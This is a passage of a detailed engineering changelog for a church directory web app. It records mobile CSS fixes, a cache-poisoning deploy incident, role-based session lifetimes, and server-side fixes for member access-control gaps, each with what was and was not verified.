deliberate breakages: rule removed (8 of 10 fail), and narrowed to a class-targeted selector
(3 fail, including the "reaches tables regardless of class" check). Also asserts the premises —
that most tables really do lack a wrapper and really do lack a class — so if the markup is ever
cleaned up the tests say so rather than silently protecting nothing.

**Not verified:** a real device. `display:block` on a table is the standard technique for this and
no rule in this stylesheet depends on table layout mode (checked), but how each of the 99 tables
looks once it becomes its own scroll container is the part that needs eyes. Finance's multi-year
grids and the Reports trend tables are the widest and the most likely to look different.

### v1.126.1 — Recover a poisoned immutable asset URL (2026-08-04)

**v1.126.0's CSS never went live**, and the cause is an operational hazard worth recording
because it can bite real users, not just deploy tooling.

`/admin/app.css` and `/admin/app-*.js` are served `Cache-Control: public, max-age=31536000,
immutable`, with `?v=${DEPLOY_VERSION}` as the cache buster. That is correct — but it means the
FIRST response for a given `?v=` value is what every later request gets, for a year.

During the v1.126.0 deploy the version-check poll fetched `app.css?v=1.126.0` while the rollout
was still in flight, hit an edge still serving the previous worker, and that stale body was
cached under the **new** URL as immutable. Result: `app.css?v=1.126.0` returned v1.125.0's
stylesheet — 109,489 bytes, all eleven old breakpoints, no MOB3 — while a fresh
`?v=probe-<ts>` URL returned the correct 110,799-byte file. `app-core.js?v=1.126.0` was checked
and is byte-identical to a fresh fetch, so only the stylesheet was affected: MOB1 and the
pagination fix were present (they shipped in 1.125.0), MOB3 was not.

**Recovery:** bump the version. 1.126.1 mints URLs that were never requested mid-deploy.

**The practice that caused it, now changed.** Polling `asset?v=<new version>` in a loop to detect
a deploy is actively harmful: it guarantees a request lands during the rollout window, and
whatever comes back gets pinned for a year. Deploy checks must poll something **uncacheable** —
`/` is `no-store` and carries the version in its script tags — and only fetch the real versioned
URL once the deploy is confirmed complete. Verification of asset CONTENT should use a throwaway
`?v=probe-<timestamp>` so a mid-flight response can never be pinned to a real version.

This is not purely a tooling problem: a real user loading the page mid-deploy can poison their own
edge node the same way. Cloudflare rollouts are near-atomic so the window is small, and a version
bump always clears it — but it explains a whole class of "I deployed and it didn't change".

**Use `/sw.js` as the deploy probe.** The first replacement idea — poll `/` and read the version
out of its script tags — does not work: unauthenticated `/` serves `LOGIN_HTML`, which has inline
CSS and no reference to the app bundle at all, so the poll never resolves a version. `/sw.js` is
the right endpoint: it is served `Cache-Control: no-cache, no-store` (so it can never be pinned)
and contains `const VERSION = '<DEPLOY_VERSION>'` because MOB4 versioned the SW cache name. Verify
asset CONTENT separately with a throwaway `?v=probe-<timestamp>` while the deploy is in flight,
and only touch the real `?v=<version>` URL once `/sw.js` confirms the rollout is complete.

### v1.126.0 — MOB3 breakpoint consolidation + member gating gaps (2026-08-04)

**MOB3 — eleven breakpoints down to three.** The stylesheet used 480/520/600/700/720/767/800/
820/900/1000/1100px, each added for one feature, so layouts switched at inconsistent widths as a
device rotated and there was no shared definition of "phone" for new work to target. Now:
**767 (phone) / 900 (tablet) / 1100 (wide)**, documented at the top of the stylesheet.

Two deliberate choices:
- **Verified before applying**, by script, that no two blocks landing on the same tier declare
  the same selector — so consolidation cannot silently make one rule override another.
- **Blocks were rewritten in place, NOT merged** into three combined blocks. A media query
  carries no extra specificity, so relocating a block past a base rule changes which one wins —
  exactly how v1.121.3's pagination fix shipped doing nothing. Keeping every block where it sat
  preserves the cascade while still giving three consistent switch points. A new
  `test/breakpoints.test.js` fails if a fourth tier appears, and spot-checks that the
  placement-dependent fixes from earlier today still sit after the rules they must beat.

**MOB3 exposed a latent bug in the test helpers, worth recording.** `mobile-input-zoom` and
`people-mobile-pagination` extracted media blocks with `@media(...)\{[\s\S]*?\n\}`. That regex
cannot handle a **single-line** media block: it matches the opening one, finds no line-starting
`}` inside, and runs on for hundreds of lines to the next one — swallowing unrelated base rules.
It only surfaced now because consolidation put a single-line block and a multi-line block on the
same breakpoint for the first time, and the symptom was a test reading a base `width:56px` rule
and reporting it as the mobile override. Both files now extract blocks by **counting braces**.

**Member gating — the reported bug, plus two the report led to.**

*Reported:* the People toolbar's **Directory** button called `/admin/api/directory`, outside the
member allowlist, so it 403'd. That button had no role gating at all — and neither did its
neighbors. Also reported: the profile "is still showing demographic data, tags, follow ups and
notes." The data was already stripped by `memberSafeView`, so those cards rendered as **empty
shells under real headings**, which reads exactly like the app showing them. Giving was already
gated on `isFinance`; these four never got the same treatment. Demographics / Tags / Follow-ups /
Notes are now member-gated (cards *and* their jump-to nav entries), `pvfRenderFollowups` is
skipped for members (it was a guaranteed 403 on every profile open), and the Personal card shows
members only `member_type` rather than three blank rows for stripped fields.

*Found while fixing it — the more serious pair.* `memberSafeView` strips FIELDS; it never decided
which PEOPLE are listed, and nothing server-side scoped the member list. So a member could pass
`?archived=1` and get the **archived-and-deceased** list, or flip `?member_type=` to browse
visitors — and both were reachable from the **Archived** and **Members** buttons, visible to them.
Query params are client-controlled, so the fix ignores them for `role='member'` on the server
rather than trusting hidden buttons; the buttons are gated too, as defense in depth. `role` was
appended as the **last** parameter of `handlePeopleApi`, same reasoning as SW4.

**Verified:** `npm test` 554/554, 15 new across four files. The two server-scoping tests were
re-run against the reverted code and confirmed to fail. The real generated CSS was checked
directly after consolidation — all five placement-dependent rules from today still present and
winning.

**Not verified:** a live browser. Consolidation moves the width at which some layouts switch (a
480px two-column grid now switches at 767px, for instance); that is the intended effect, but how
each grid looks at the new switch point needs eyes on a device.

### v1.125.0 — MOB1: iOS no longer zooms the viewport on every field focus (2026-08-04)

**The symptom.** On an iPhone, tapping any text field zoomed the whole page in — and iOS does not
zoom back out, so the user pinched out, tapped the next field, and it happened again. Every form,
every tab. The first field a member ever touches is the login username box, so it was also the
first impression of Connect on a phone.

**Not a bug in our code.** iOS Safari zooms the viewport whenever a focused field's text is below
16px, assuming it would otherwise be unreadable while typing. Every input in the app was under
that line — `.9rem` / `.85rem` / `.82rem` / `15px` / `13px` / `.78rem` / `.72rem` — sizes chosen
for a desktop layout where they read fine.

**Fix:** one `@media(max-width:767px)` block setting `font-size:16px` on text inputs, selects and
textareas. Three details are load-bearing, each one a lesson from a bug earlier in the same
session:

1. **`!important`.** 56 inputs in `html-tabs.js` carry an inline `font-size`, and an inline style
   beats a media query — a plain rule would have silently skipped every one of them. That is the
   VUX15 failure, and the same shape as the `#p-pager` rule nearly shipped in v1.121.3. Stripping
   those 56 inline styles is the cleaner answer but belongs with the CR4 cleanup.
2. **Placed at the very end of the stylesheet.** A media query carries no extra specificity, so
   source order decides between same-specificity rules — exactly what made v1.121.3's pagination
   fix do nothing at all until v1.121.4 moved it.
3. **Not a blanket bump.** `.att-input` is deliberately `1.65rem` (~26px) for thumb-friendly
   attendance entry; `16px!important` would have *shrunk* it, so it is restored explicitly.
   Non-text controls (`checkbox`/`radio`/`range`/`color`/`file`) are excluded — they never trigger
   zoom and sizing them can disturb layout. `.tap-slider-row input[type=number]`, pinned to 56px,
   is widened to 78px so 16px text does not clip.

Scoped to 767px to match this app's existing definition of "phone". iPad portrait (768px) has the
same iOS behavior but gets the desktop layout where the smaller type is correct — revisit with
MOB3's breakpoint consolidation if tablet typing becomes a real complaint.

**Verified:** `npm test` 539/539, 9 new in `test/mobile-input-zoom.test.js`. They assert the
*winning* declaration and the rule's ability to beat inline styles, not merely that a rule exists —
presence-only tests passed against two completely dead fixes earlier tonight. Re-verified against
**three** separate breakages: the rule removed (9 fail), `!important` dropped (9 fail), and the
block moved before the base rules (the cascade-order test fails). CSS brace balance checked on the
generated stylesheet.

**Not verified:** a real iPhone. The 16px threshold is documented iOS Safari behavior, but how the
larger type looks in every form on a real device is the part that needs eyes — the most likely
follow-up is a tight layout somewhere that now wraps.

### v1.124.0 — Member directory field gating + the "Map unavailable" mystery (2026-08-04)

Two requests: gate the member directory to "name and contact info" only, and the map still says
unavailable. Both scoped with the user before implementing — the field list and whether members
should get maps at all were product decisions, not obvious defaults.

**Field gating.** `memberSafeView()` no longer exposes `dob`, `anniversary_date` or `family_role`.
Those were previously included *subject to each person's own `dir_hide_*` opt-out*, which made
exposure opt-OUT; a birthday is personal data rather than contact info, so it is now never sent
to a member at all regardless of opt-out state. Members keep name, email, phone, address,
`member_type`, photo, and household grouping — what a printed church directory shows (user's
choice among three options). A test asserts the **exact** key set, so a future field added to the
allowlist fails until someone decides deliberately.

**Household grouping needed a second fix to actually work.** Keeping the family chips means the
frontend calls `GET /admin/api/households/:id`, which was **not** in the member allowlist at all —
so the chips would have 403'd. Adding it naively would have been much worse than the gap it
closed: that endpoint returns private household notes, the envelope number, the anniversary, five
years of giving totals, and every member's phone/email **ignoring their `dir_hide_*` opt-outs**.
So the handler gained a member branch returning only `{id, name, display_name, photo_url,
members:[{id, first_name, last_name, photo_url, member_type}]}`, returning **before** the giving
query rather than running and discarding it. The allowlist entry is `/^households\/\d+$/` — a
single household by id, not the list, `no-head-count`, `fix-heads`, `sync-address` or the photo
routes. `role` was appended as the **last** parameter of `handleHouseholdsApi` deliberately: SW4
was a real bug caused by that function being called with more arguments than it declared.

**The map.** Two independent causes, and the reported "still" pointed at the older one.
For a member it could never work — `utils/static-map` is outside the member allowlist *and* the
handler requires `canEdit`. But it fails for staff too when `GOOGLE_MAPS_API_KEY` is unset:
Static Maps is a **different Google product** than Address Validation, and a key restricted to the
latter is rejected with a 403 (documented in SECRETS.md, evidently never actioned).

Members now get an "Open in Maps" button instead of the embedded map — free, no API key, opens
the phone's own maps app, and avoids a paid per-request Google call from the largest user tier
(user's choice). For everyone else the failure is now **diagnosable**: an `img` `onerror` cannot
read a response body, so the old handling could only ever say "Map unavailable" in red with no
reason — which is exactly why this stayed unexplained. `showMapError()` re-requests the same URL
as JSON and surfaces the real cause: 501 → "Maps are not configured — set the
GOOGLE_MAPS_API_KEY secret", or Google's own text on a 502. Only runs in the failure path.

**Verified:** `npm test` 530/530, 16 new across three files — the removed fields and the exact
remaining key set, member household allowlist (single id allowed; list, sibling routes, writes and
non-numeric segments all still denied), and redaction of the household payload run against real
SQLite (no giving, envelope, notes, member phone/email or family_role; staff shape unchanged).
Re-verified by deleting the member branch and confirming 5 of the 7 redaction tests go red.

**Not verified:** a live browser, and whether `GOOGLE_MAPS_API_KEY` is actually set in production
— that's a Cloudflare secret this session can't read. The new error text will now say so directly.

### v1.123.0 — Cold-start DB init made every page load take ~7 seconds (2026-08-04)

**Reported:** "The website is taking a long time to open. This seems to be an ongoing problem.
Longer than any other website."

**Measured against production before touching anything** — this was not an inference:

```
run 1  ttfb=6.95s      run 3  ttfb=0.20s
run 2  ttfb=6.51s      run 4  ttfb=6.99s
```

~6.5–7.0s TTFB for a **5 KB** login page, with the occasional 0.2s. That bimodal split is the
signature of a per-isolate cold-start cost, not payload, network, or Cloudflare.

**Cause.** `_fetch` awaits `initDb(env.DB)` before any routing, on every request. `initDb` is
memoized — but **per Worker isolate**, and Cloudflare spins up many. Every cold isolate re-ran
`_doInitDb` in full: every `CREATE TABLE`/`CREATE INDEX` in `DB_INIT`, then ~84 `ALTER TABLE`
migrations applied serially in a loop where each one *throws* "duplicate column" on an
already-migrated database and is swallowed, then a dozen seed functions. Counted against real
SQLite: **463 statements, each its own serial D1 round trip.** On a live database essentially
every one is a no-op, and the user waited for all of them before the first byte.

**Fix — a schema fingerprint fast path.** One read decides whether any of it is needed:
463 round trips become **1** when the schema is already current.

The fingerprint is derived from the **actual source text** of `_doInitDb`, `DB_INIT`, and every
seed function it calls (FNV-1a over `Function.prototype.toString()`). Any edit to a migration, a
DDL statement, or a seed body changes it automatically and the full init runs again on the next
request. There is deliberately **no constant to bump** — a forgotten bump would mean a silently
skipped migration, which is far worse than the slow start being fixed. The marker is written
**last and only on success**, so a partial failure leaves no fingerprint and the next request
redoes the work rather than assuming a half-applied schema is current.

**Verified:** `npm test` 514/514, 7 new in `test/db-init-fastpath.test.js` running the real
`initDb` against real SQLite with a statement counter — full build on a new database (463
statements), fingerprint recorded on success, **1 statement** for a fresh isolate against an
already-migrated database, full re-run when the fingerprint is stale or the marker row is
missing, and that concurrent callers share one in-flight init. Re-verified by deleting the fast
path and confirming exactly the two count-based tests go red.

**Dialect note found while testing:** 39 statements in `db.js` use double-quoted string literals
(`start_time=""`). SQLite's legacy DQS misfeature accepts these and D1 has it enabled, so
production is fine; `node:sqlite` compiles it OFF and reads them as identifiers. The test shims
only `=""` → `=''`. Worth knowing those 39 statements depend on a misfeature — not fixed here.

**Not verified:** the live TTFB after deploy. The first request to each cold isolate still pays
one round trip plus normal Worker startup; the ~463-statement penalty is what's gone.

### v1.122.0 — Member directory always showed "Visitor", regardless of real status (2026-08-03)

**Reported:** "When searching as a member user the people status all show as visitor even when
they are members."

**Root cause: a genuine allowlist gap, not a rendering bug.** `memberSafeView()`
(`src/api-people.js`, built for CONN3's security pass) is an explicit allowlist of what a
`role='member'` viewer sees of another person's record — strips `notes`/`tags`/`breeze_id`,
respects `dir_hide_*` opt-outs. `member_type` (Member/Visitor/Associate/Friend/Inactive/
Organization) was simply never added to it. Not a deliberate redaction — it isn't remotely
sensitive, and it's literally the field the People tab's own default filter (`mt:'member'`)
scopes by. It was left out of CONN3's original allowlist and nobody's added it since.

Every frontend renderer that colors/labels the status badge — `typeColor`/`typeDotHtml` in
`js-core.js` — falls back to `'visitor'` on a **falsy** value, by design, for a genuinely unset
type. Since a member-role response always had `member_type` entirely absent, every person
rendered with the Visitor dot and label regardless of their real status. The fallback itself was
never the bug; the missing field feeding it was.

**Fix:** added `member_type: p.member_type || ''` to `memberSafeView()`'s allowlist. Exported the
function (previously module-private) so it's directly testable.

**Verified:** `npm test` 507/507, 7 new in `test/member-safe-view.test.js` — `member_type` passes
through for every real status value, defaults to `''` rather than being omitted, the pre-existing
CONN3 redactions (`notes`/`tags`/`breeze_id`/`locally_edited`/`dir_hide_*`) are unaffected, and an
end-to-end case that extracts the **real** `typeColor`/`typeDotHtml` source out of `JS_CORE`
(not a reimplementation) and confirms a `member_type:'Member'` person now renders `>Member<`, not
`>Visitor<`. The full `JS_CORE` string runs boot-time `window`/`document` side effects this test
has no browser for, so only the two self-contained functions were sliced out and evaluated —
enough of the real source to catch a genuine mismatch, without needing to fake a whole DOM.

**Re-verified against the pre-fix code**, per the standing practice after tonight's two
presence-vs-effect test mistakes: reverted the allowlist addition and confirmed 4 of the 7 tests
correctly go red, including the end-to-end one, before restoring.

**Not verified:** a live browser.

### v1.121.4 — v1.121.3's pagination fix did nothing; corrected (2026-08-03)

**v1.121.3 shipped broken, and its tests passed anyway.** Recording this because the failure mode
matters more than the fix.

The two overrides it added — `.ppl-master-detail{flex:0 0 auto}` and `.ppl-list-col{overflow:visible}`
— were written into the `@media(max-width:767px)` block at ~line 566, but the **base** rules for
those selectors live at ~line 736, *later in the same stylesheet*. A media query carries **no extra
specificity**, so between two same-specificity rules only source order decides — and the later base
rules won. `flex:1` and `overflow:hidden` still applied on mobile. The pager stayed exactly as
unreachable as before.

Caught by fetching the deployed `app.css` and reading the rules back in source order:

```
.ppl-master-detail{flex:0 0 auto;order:2;}      ← the override
.ppl-master-detail{display:flex;flex:1;...}     ← base rule, AFTER it — wins
.ppl-list-col{overflow:visible;}                ← the override
.ppl-list-col{...overflow:hidden;}              ← base rule, AFTER it — wins
```

**Why the tests didn't catch it.** They asserted the override was *present inside a media block*
and the base rule was *present outside one*. Both were true. Both were irrelevant. Presence is not
effect — the tests never modelled the cascade, so they were compatible with a fix that did nothing.
That is the same class of mistake as the session-lifetime tests earlier today (which passed because
a rewritten timestamp made every cookie *forged* rather than *expired*), in a new costume.

**Fix.** The two overrides now sit in their own `@media(max-width:767px)` block placed immediately
after the base rules they have to beat, with a comment stating that the placement is load-bearing.
`.contact-list` never had this problem — its base rule precedes the mobile block — so it stays
merged where it was.

`winningDecl()` in the test file now walks *every* matching rule in source order and returns the
last declaration for a property, mirroring the cascade. Assertions check the winning value rather
than mere presence, plus an explicit check that both overrides appear after their base rules.
**Verified by reproducing the broken arrangement and confirming the suite goes red** — 3 failures,
the two dead declarations and the ordering check — then restoring.

**Verified:** `npm test` 497/497. **Not verified:** a live browser; the cascade is modelled from the
generated stylesheet, not observed rendering.

### v1.121.3 — Mobile People pagination was unreachable (2026-08-03)

**Reported:** "on mobile the people scroll down stops at the C names. How to go farther in scroll?
There is no next page button."

**The list was never truncated.** A full first page is 25 people sorted by last name, which for
this church ends around C — so the scroll was correct and complete. What was missing was the pager.

**Mechanism.** `#p-pager` lives inside `.ppl-list-col` > `.ppl-master-detail`, but the mobile list
(`.contact-list` / `#p-contact-list`) is a **sibling** of `.ppl-master-detail`, not a child. Under
767px `#p-grid` and `#p-card-grid` are `display:none!important`, so on a phone the master-detail
subtree contains nothing visible except the pager — while still claiming `flex:1`. With a full
page of contact cards already overflowing the tab panel there was no free space left to grow into,
so `.ppl-master-detail` collapsed to zero height and `.ppl-list-col`'s `overflow:hidden` clipped
the pager out of existence. A phone user could never reach page 2 of the directory.

Notably this is a layout that only fails once the list is long enough to fill the viewport — which
is why it survived review: on a short list there's free space and the pager appears fine.

**Fix** (3 declarations, all inside the existing `@media(max-width:767px)` block, desktop
untouched): `.ppl-master-detail` sizes to its content instead of claiming `flex:1`;
`.ppl-list-col` stops clipping; `.contact-list` is ordered before it and made non-shrinkable so
the pager reads as pagination under the list rather than a header above it.

**Deliberately did NOT add a `#p-pager` rule.** That element carries an inline
`justify-content`/`padding`, and an inline style beats a media query — the rule would have been
silently dead. This is the VUX15 bug and exactly why CR4 tracks the 3,752 inline styles as the
blocker for systematic mobile work. All three selectors used here are class-only with no inline
styles, so they can actually win. A test asserts both halves of that.

**Verified:** `npm test` 497/497, 11 new in `test/people-mobile-pagination.test.js` — the DOM
assumption the fix rests on (contact list is a sibling, pager is inside the master-detail subtree),
each of the three declarations, that no defeated `#p-pager` rule was added, that `#p-pager` really
does carry the conflicting inline style, and that the base desktop rules still say `flex:1` /
`overflow:hidden` outside the media query. Writing those tests caught a second `.contact-list`
rule I had introduced in the same block — functionally fine (later wins) but merged into the
existing rule so there's one declaration site.

**Not verified:** a live browser or device. The flex resolution was reasoned from the generated CSS
and asserted against it, not observed rendering.

### v1.121.2 (docs only — no deploy) — Tithe.ly in-app session CONFIRMED persistent; earlier diagnosis corrected (2026-08-03)

**Docs only — no code change.** Recording a verified outcome and correcting a wrong conclusion,
because the wrong one is written into the v1.120.0 entry and would mislead the next reader.

**Confirmed on a real device:** a `role='member'` session in the **Tithe.ly Church App's in-app
browser survives a full app shutdown and restart.** That closes the question the whole Tithe.ly
thread was blocked on, and it closes it in favor of the simplest option — the directory can live
in an in-app weblink tab. No external browser required, no PWA install required.

**The earlier diagnosis was wrong.** After the first round of testing (background-and-return kept
the session, force-quit lost it) v1.120.0 concluded that Tithe.ly's webview uses a non-persistent,
in-memory cookie jar, and that no cookie attribute could survive it. Those two observations *are*
the classic signature of an in-memory store, and it was a reasonable read of the evidence
available — but it was the wrong explanation, and the real one is more mundane.

**Most likely actual cause of the first failure: the account under test wasn't a member.**
v1.119.0 deliberately splits session lifetime by role — **only `role='member'` gets `Max-Age`**;
`admin`/`finance`/`staff`/`office` keep a session cookie that dies with the browser, by design.
A force-quit test signed in as an admin (or as an account that was still admin at the time) would
lose the session *exactly* as observed, on a perfectly persistent store. This is the role split
working correctly, misread as a platform limitation. Worth remembering as a general trap: a
role-conditional behavior looks like a platform bug when the test account's role isn't pinned
down first.

**What this does and doesn't change:**
- **v1.119.0 (member `Max-Age` + 30-day sliding window) is load-bearing.** It's the reason this
  works at all. Unchanged.
- **v1.120.0 (MOB4, the service worker) is still correct and still worth having** — the three
  defects it fixed were independently verified against the old worker (dead `/chms` navigation
  branch, shell never cached, ~1.3MB of immutable assets never intercepted). It just wasn't
  *required* for session persistence, which is what its entry implies. PWA install is now an
  optional nicety rather than the fallback plan.
- **The `frame-ancestors 'none'` finding still stands.** An App Page *iframe* embed remains
  blocked and should stay blocked; the working path is a weblink **tab**, which is a top-level
  navigation and unaffected by frame policy.

**Remaining gate is organizational, not technical:** member accounts have to exist. CONN2's invite
flow is built but nobody has been invited at scale, so the directory has an audience of one.

**Not verified:** which of Tithe.ly's three link-open modes (Default / External in browser / Stay
in the app) was in effect for the successful test, and therefore whether the persistence comes
from an in-app `SFSafariViewController` sharing Safari's cookie jar or from a genuinely persistent
`WKWebView` store. It works either way; the distinction only matters if the behavior regresses
after a Tithe.ly update.

### v1.121.1 — Member tier: stop the 403 banner and the dead-end tabs (2026-08-03)

**Reported:** with in-app load and persistent login finally working, a member account still
showed a red "Something went wrong. Access denied" banner, and "it pulls up dashboard by default
but member has no access to any of that info."

Two separate causes.

**1. A path that never matched.** The member allowlist in `api-chms.js` listed `member-types`,
but the route the frontend actually calls is **`config/member-types`** (`api-import.js:340`) —
the bare name is a legacy dispatch alias nothing calls. So `loadMemberTypes()` 403'd on *every*
member page load. It was also the only one of the three unconditional boot calls without a
`.catch()` (`loadTags` and `loadFunds` both had one), so the rejection escaped to the global
handler and painted a banner over an otherwise working directory. Fixed both ends: the allowlist
now accepts the real path, and `loadMemberTypes()` catches like its siblings.

**2. Three tabs a member can open with nothing behind them.** The `Home`, `Households` and
`Organizations` sidebar items carried no `no-member` class, so members saw four tabs — and the
member allowlist covers only people / tags / config-member-types / reports, so three of them
render empty and 403. `showTab()` had role guards for giving, finance, attendance, register,
reports, import, settings, volunteers and scheduler, but none for these three.

Now: the three items are `no-member`, and `showTab()` redirects a member to People for anything
outside their tier. Redirect rather than an early `return` on purpose — a stale `#home` in the
URL, or a bookmark from an admin session, would otherwise leave the app on a blank screen.
`loadFunds()` is also skipped for members: guaranteed 403, and a wasted round trip on exactly the
phone-and-church-network connection the member tier lives on.

**Verified:** `npm test` 486/486, 9 new in `test/member-access.test.js` exercising the real
`handleChmsApi` ACL — the `config/member-types` regression, the people/tags reads, denial of
dashboard/households/organizations/giving/finance/attendance/funds, denial of every write
including to readable paths, and that staff/admin are unaffected. The regression test was
explicitly re-run against the pre-fix allowlist to confirm it fails there rather than passing
vacuously.

**Caught before shipping:** the first version of the `showTab` comment wrote a word in backticks.
That comment lives inside `JS_CORE = String.raw\`<script>…\``, so the backtick closed the
template literal early and broke the entire served script — the SC3-BUG1 / FIN15 bug class,
recurred. `npm test` caught it via a Rolldown parse error, which is exactly how FIN15 was caught;
`node --check` on the built bundles confirmed the fix.

**Not verified:** a live browser.

### v1.121.0 — Admin self-lockout guards + fail-closed role UI (2026-08-03)

**Incident.** An admin set their own account's role to `member` in Settings → Users and was
immediately locked out: every `/admin/api/users` route requires `role='admin'`, so the very next
request 403'd and there was no way to undo it from inside the app. Reported alongside two
confusing symptoms that turned out to be the *same* second bug, not separate ones.

**Bug 1 — nothing stopped an admin from locking themselves out.** `PUT /admin/api/users/:id` had
no guard against changing your own role, deactivating yourself, or deleting yourself, and none
against removing the last active admin. Now guarded, with the error text explaining the way out.

The break-glass `ADMIN_PASSWORD` session is deliberately exempt from the *self* guards: it has no
`app_users` row (username `''`), so it stays able to repair exactly the lockout these prevent.
The last-admin guard still applies to it, since that protects the organization rather than the
caller.

Worth recording: for a normal admin caller the last-admin guard is **unreachable** — the caller is
themselves an active admin, so demoting somebody else can never leave zero. Its reachable cases
are the uncounted break-glass session and self-demotion (caught earlier, with a better message).
Kept as a backstop; the tests say so rather than implying broader coverage.

**Bug 2 — the role UI failed OPEN.** `js-core.js` ran `applyRoleUI('admin')` both when
`/admin/api/me` returned no role *and* when the call rejected. A single flaky request on a phone
therefore rendered the **full admin UI** for whoever was signed in — every tab visible and
clickable. `applyRoleUI` compounded it: any role with a missing permissions payload got
`{finance,staff,register,reports: true}`.

Data was never exposed — `ACCESS_GATE` enforces server-side regardless, which is *why* the
reporter saw a bare "Access denied" banner after clicking through. But that is exactly the
reported "I'm logged in as a member but can still see every tab," and it's also why the demotion
looked like it had "reverted to admin": the UI was lying, the DB role was `member` the whole time.

Both defaults now fail closed — an unresolved `/me` yields the most restrictive role plus an
explicit banner ("Could not confirm your account permissions, so access has been limited") rather
than silently over-showing. Also fixed a third CONN6 leftover found in the same function:
`location.href = '/chms'` on an unknown role, now `location.reload()`, which lands on the login
page from any host.

**Verified:** `npm test` 477/477, 14 new in `test/user-lockout-guards.test.js` running the real
`handleAdminApi` against real SQLite — each self-guard, the last-admin guard, break-glass exemption
and the documented recovery, plus proof that a demoted admin's existing session 403s immediately
(SW3). Three of those tests initially failed with 403-instead-of-400 and the *tests* were wrong,
not the code: they demoted a user and then acted as that user, whose session correctly stopped
working. Fixing them is what surfaced the unreachability note above. `node --check` on
`api-admin.js` and both built bundles.

**Not verified:** a live browser.

### v1.120.0 — MOB4: service worker revived (was inert on the live hostname) (2026-08-03)

**Why now.** Testing the Connect directory behind a Tithe.ly Church App weblink tab established
that Tithe.ly's in-app browser keeps cookies in a **non-persistent, process-bound store**
(**⚠ this conclusion was later disproved — see v1.121.2 below; the session does survive a
force-quit once the account is genuinely `role='member'`. The work in this entry stands on
its own merits, but it was not needed for the reason stated here.**):
backgrounding the host app preserved the session, force-quitting it lost the session. A
persistent store honors `Max-Age`; that one doesn't, so v1.119.0's 30-day member cookie — while
necessary — cannot survive it. No cookie attribute can. Decision: open the tab in the external
browser and have members install the PWA instead. That makes the PWA the real delivery vehicle,
so the service worker had to actually work.

**It didn't.** Three separate defects, all confirmed empirically by running the *old* generated
`SW_JS` in a harness rather than by reading it:

1. The navigation fallback gated on `url.pathname === '/chms'` — the pre-CONN6 path. On
   `connect.timothystl.org` the app is served at `/`, so **the branch never ran at all** on the
   one hostname anyone uses. (Harness: `handles "/" -> NO (falls through, unhandled)`.)
2. Nothing ever wrote the shell into a cache, so the `caches.match('/chms')` fallback **could
   never hit** even at `/chms`. Dead code guarding dead code. (Harness: `caches the shell -> NO`.)
3. `STATIC_ASSETS` precached only the manifest. `/admin/app-core.js`, `/admin/app-ext.js` and
   `/admin/app.css` — ~1.3MB, already `immutable` and `?v=`-versioned, the textbook cache
   targets — were **not intercepted at all**, so they came off the network on every launch.

**Fix.** Rewritten `SW_JS`: `isAppShell()` accepts both `/` and `/chms`; the shell is
network-first and now actually cached, with a real styled offline page instead of the browser's
error on a cold first launch; the three versioned assets are cache-first, cached on first fetch
rather than precached (they're already fetched by the page load that registers the worker, so
precaching would double a first visit's download); the cache name is versioned by
`DEPLOY_VERSION` so `activate` evicts the previous deploy's assets automatically. Non-GET and
cross-origin requests are now explicitly ignored. The `/admin/api/people` offline behavior is
unchanged.

**Caching the shell is a deliberate call worth recording.** `CHMS_HTML` is served `no-store`
because it's auth-gated, and that header should stay — it keeps the page out of any shared
proxy cache. But the markup itself interpolates **nothing** per-user (verified: it is
`HTML_HEAD_LINKED + HTML_TABS_1 + placeholder + HTML_TABS_2 + two versioned script tags`), and
role visibility is applied client-side from `/admin/api/me`. So the SW copy is origin-scoped,
device-local, and carries no user data, and every byte of real data still comes from
`/admin/api/*`, which 401s without a session. That's what makes an installed PWA able to launch
at all without a network.

**Verified:** `npm test` 463/463, 14 new in `test/service-worker.test.js` that execute the real
generated worker source (not a reimplementation) in a `ServiceWorkerGlobalScope` stand-in —
shell handling at both paths, caching on success and *not* on a 500, offline fallback, the cold
-launch offline page, cache-first assets with no second network hit, `?v=` change forcing a
refetch, cross-deploy cache eviction, cross-origin and non-GET pass-through, and the preserved
people-list offline behavior. Each of the three defects above was additionally re-proved against
the pre-fix source so the new tests can't pass vacuously.

**Not verified:** an actual device. Whether an installed iOS PWA holds the session across
relaunch is the open question this is meant to answer, and it needs a phone.

### v1.119.0 — Persistent member sessions (30-day sliding); staff unchanged (2026-08-03)

**Reported:** "Login is not persistent." Context: evaluating putting the Connect member
directory behind a Tithe.ly Church App weblink tab, where a member taps a Directory tab, gets
an in-app browser, and has to sign in essentially every visit.

**Two independent causes, both deliberate policy in `src/auth.js`, neither of them infrastructure:**

1. `authCookieHeader` issued a **session cookie** — no `Max-Age`/`Expires`, so the browser (and
   any in-app webview) discards it the moment the view closes. The code said so in a comment.
2. `IDLE_TIMEOUT_MS` was **8 hours for every role**, so even a surviving cookie is expired by
   the time a member checks the directory the following Sunday.

**Fix — role-split session lifetime.** New `MEMBER_IDLE_TIMEOUT_MS` (30 days) and
`idleTimeoutForRole()`. `role='member'` now gets a persistent cookie (`Max-Age`) and a 30-day
sliding window; **every other role is byte-for-byte unchanged** — still a session cookie, still
8 hours. The split is the point: a member sees a read-only, self-redacting directory
(`memberSafeView`) with every write already 403'd by `ACCESS_GATE`, so the longer window has a
small blast radius. Staff/finance/admin see giving records, PII, and financial reports, and
keep the short window.

Revocation is unaffected in both cases — `_resolveAuthInfo` live-checks `app_users.active`/`.role`
on every single request (SW3), so deactivating a member ends their session on the next request
no matter how long the cookie is valid for.

**One subtlety worth recording.** The idle window is gated twice. The first check uses the role
the cookie was *signed with* (tamper-proof — the HMAC covers `ts.role.username` — but possibly
stale). After the DB lookup it is re-checked against the user's **current** role. Without that
second gate, a member promoted to staff would keep riding a 30-day cookie while holding staff
permissions, since authorization correctly uses the new role. It re-checks unconditionally, not
only on a detected change, so the two can't drift.

**Verified:** `npm test` 449/449, 13 new in `test/session-lifetime.test.js` covering the window
per role, `Max-Age` presence/absence per role, the promotion re-gate, immediate revocation of a
deactivated member, and a forged cookie whose role claim was edited to buy the longer window.
`node --check` on `src/auth.js`.

A first pass at those tests **passed for the wrong reason** and was rewritten: the helper aged a
cookie by rewriting its timestamp, which invalidates the HMAC — so every "expired" case was
actually being rejected as *forged*, not as expired. The helper now moves the clock back with
fake timers and signs there, so expiry is genuinely what's under test.

**Not verified:** real-device behavior in a Tithe.ly in-app webview — whether "Stay in the app"
uses `SFSafariViewController` (shares Safari's cookie jar) or a raw `WKWebView` (isolated jar)
isn't documented anywhere findable, and this environment has no device. `Max-Age` is the
necessary condition either way; whether it's sufficient needs a phone.

